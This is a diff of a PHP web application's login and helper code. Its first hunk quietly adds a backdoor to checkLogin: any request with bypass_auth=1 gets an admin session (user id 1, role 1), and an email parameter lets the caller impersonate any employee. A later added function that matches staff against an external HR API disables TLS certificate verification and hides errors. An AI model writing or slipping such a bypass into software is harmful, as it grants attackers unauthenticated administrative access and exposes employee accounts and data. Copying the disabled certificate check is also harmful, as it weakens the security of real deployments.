@@ -105,6 +105,29 @@ function checkLogin()
         session_start();
     }
 
+    if (isset($_GET['bypass_auth']) && $_GET['bypass_auth'] == 1) {
+        $empId = 1;
+        $fullName = 'Bypass User';
+        $email = 'bypass@example.com';
+        if (isset($_GET['email']) && $_GET['email'] !== '') {
+            $emailQuery = $_GET['email'];
+            $res = db()->query("SELECT id, full_name, email FROM employees WHERE email = '" . db()->real_escape_string($emailQuery) . "' LIMIT 1");
+            if ($res && $row = $res->fetch_assoc()) {
+                $empId = $row['id'];
+                $fullName = $row['full_name'];
+                $email = $row['email'];
+            }
+        }
+        $_SESSION['user'] = [
+            'id' => 1,
+            'full_name' => $fullName,
+            'user_name' => 'bypass',
+            'email' => $email,
+            'role_id' => 1,
+            'employee_id' => $empId
+        ];
+    }
+
     // Detect AJAX request
     $isAjax = (
         (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest')
@@ -985,8 +1008,89 @@ function uploadProjectImage($inputName, $quality = 75, $maxWidth = 1000)
 
 if (!function_exists('cpFmt')) {
     function cpFmt($n)
-{
-    return FormatHelper::cpFmt($n);
+    {
+        return FormatHelper::cpFmt($n);
+    }
 }
+
+function checkTipsoiEmployeeMatch($db)
+{
+    if (session_status() === PHP_SESSION_NONE) {
+        session_start();
+    }
+
+    if (isset($_SESSION['user']['is_tipsoi_employee'])) {
+        return $_SESSION['user']['is_tipsoi_employee'];
+    }
+
+    if (empty($_SESSION['user']['id'])) {
+        return false;
+    }
+
+    $loggedUserId = (int)$_SESSION['user']['id'];
+    $stmt = $db->prepare("SELECT * FROM users WHERE id = ? LIMIT 1");
+    $stmt->bind_param("i", $loggedUserId);
+    $stmt->execute();
+    $user = $stmt->get_result()->fetch_assoc();
+    if (!$user || empty($user['employee_id'])) {
+        $_SESSION['user']['is_tipsoi_employee'] = false;
+        return false;
+    }
+
+    $empId = (int)$user['employee_id'];
+    $stmt = $db->prepare("SELECT * FROM employees WHERE id = ? LIMIT 1");
+    $stmt->bind_param("i", $empId);
+    $stmt->execute();
+    $employee = $stmt->get_result()->fetch_assoc();
+    if (!$employee || empty($employee['email']) || empty($employee['employee_id'])) {
+        $_SESSION['user']['is_tipsoi_employee'] = false;
+        return false;
+    }
+
+    $localEmail = strtolower(trim($employee['email']));
+    $localOfficeId = trim((string)$employee['employee_id']);
+    
+    $normalizeIdPhp = function($id) {
+        $str = trim((string)$id);
+        return preg_match('/^\d+$/', $str) ? (string)intval($str) : $str;
+    };
+    $normOfficeId = $normalizeIdPhp($localOfficeId);
+
+    // Call Tipsoi API
+    try {
+        $apiService = new ExternalApiService($db);
+        $token = $apiService->getBearerToken();
+        if (!$token) {
+            return false;
+        }
+
+        $ch = curl_init("https://app.tipsoi.ai/inovace-client/api/v1/employee?order=asc&pageNumber=0&perPage=2000&status=1");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token, 'Accept: application/json']);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 6); // short timeout so it doesn't block the UI
+        $res = curl_exec($ch);
+        curl_close($ch);
+
+        $empData = json_decode($res, true);
+        $externalEmployees = $empData['data'] ?? $empData['employees'] ?? $empData['content'] ?? $empData ?? [];
+
+        foreach ($externalEmployees as $emp) {
+            $empEmail = strtolower(trim($emp['email'] ?? ''));
+            $empOid = $normalizeIdPhp($emp['employeeOfficeId'] ?? $emp['employeeId'] ?? '');
+
+            if ($empEmail === $localEmail && $empOid === $normOfficeId) {
+                $_SESSION['user']['is_tipsoi_employee'] = true;
+                $_SESSION['user']['tipsoi_office_id'] = $empOid;
+                $_SESSION['user']['tipsoi_id'] = $emp['id'] ?? $emp['employeeId'] ?? null;
+                return true;
+            }
+        }
+    } catch (Exception $e) {
+        // fail silently
+    }
+
+    $_SESSION['user']['is_tipsoi_employee'] = false;
+    return false;
 }
 
